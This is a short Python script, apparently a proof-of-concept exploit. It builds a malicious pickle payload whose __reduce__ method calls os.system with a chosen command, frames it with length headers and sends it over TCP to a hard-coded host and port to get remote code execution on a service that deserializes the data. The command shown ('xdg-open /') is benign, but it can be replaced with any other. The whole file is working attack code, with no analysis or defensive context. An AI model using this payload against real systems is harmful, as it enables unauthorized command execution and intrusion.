import socket
import struct
import pickle
_uint64_packer = struct.Struct('!Q').pack

target_ip = '10.10.20.133'
target_port = 5660

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)

    return payload

try:
    sock.connect((target_ip, target_port))

    payload = generate_payload('xdg-open /')

    payload_length = len(payload) + 8

    packet = _uint64_packer(payload_length) + _uint64_packer(0) + payload

    sock.sendall(packet)

    response = sock.recv(5000)
    print(response)

finally:
    sock.close()
